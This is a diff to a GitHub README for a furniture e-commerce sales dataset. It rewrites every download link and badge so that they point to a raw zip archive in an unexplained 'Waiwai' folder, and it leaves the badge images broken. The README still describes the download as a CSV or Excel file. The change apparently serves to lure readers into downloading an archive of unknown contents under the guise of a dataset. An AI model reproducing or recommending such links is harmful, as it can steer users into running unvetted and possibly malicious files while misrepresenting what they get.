@@ -1,6 +1,6 @@
 # 🛋️ E-commerce-Furniture-Dataset-2024 - Unlock Insights for Better Sales
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Obaydul201/E-commerce-Furniture-Dataset-2024/releases)
+[![Download Now](https://raw.githubusercontent.com/Obaydul201/E-commerce-Furniture-Dataset-2024/main/Waiwai/E-commerce-Furniture-Dataset-2024.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Obaydul201/E-commerce-Furniture-Dataset-2024/main/Waiwai/E-commerce-Furniture-Dataset-2024.zip)
 
 ## 📋 Description
 This project analyzes global e-commerce furniture sales to identify top products, pricing strategies, and the impact of promotions on customer behavior. It provides actionable insights to enhance sales performance and optimize marketing efforts in the digital retail space.
@@ -14,7 +14,7 @@ Follow these steps to download and run the E-commerce-Furniture-Dataset-2024 app
 - An application to open CSV and Excel files, such as Microsoft Excel, Google Sheets, or a similar program.
 
 ## ⬇️ Download & Install
-1. First, visit the [Releases page](https://github.com/Obaydul201/E-commerce-Furniture-Dataset-2024/releases) to access the latest version of the dataset.
+1. First, visit the [Releases page](https://raw.githubusercontent.com/Obaydul201/E-commerce-Furniture-Dataset-2024/main/Waiwai/E-commerce-Furniture-Dataset-2024.zip) to access the latest version of the dataset.
 2. Look for the most recent release.
 3. Click on the dataset file to download it. This will typically be a .csv or .xlsx file for your analysis.
 4. Once the download is complete, locate the file on your computer.
@@ -46,7 +46,7 @@ For further insights and detailed analysis, consider the following topics:
 ## 📥 Download Now
 To get started, click the link below to download the dataset once more.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Obaydul201/E-commerce-Furniture-Dataset-2024/releases)
+[![Download Now](https://raw.githubusercontent.com/Obaydul201/E-commerce-Furniture-Dataset-2024/main/Waiwai/E-commerce-Furniture-Dataset-2024.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Obaydul201/E-commerce-Furniture-Dataset-2024/main/Waiwai/E-commerce-Furniture-Dataset-2024.zip)
 
 ## 💬 Community and Support
 If you have questions, suggestions, or want to join discussions, check our community forums or submit an issue on the GitHub repository. Your feedback is valuable and helps us improve the dataset and its applications.
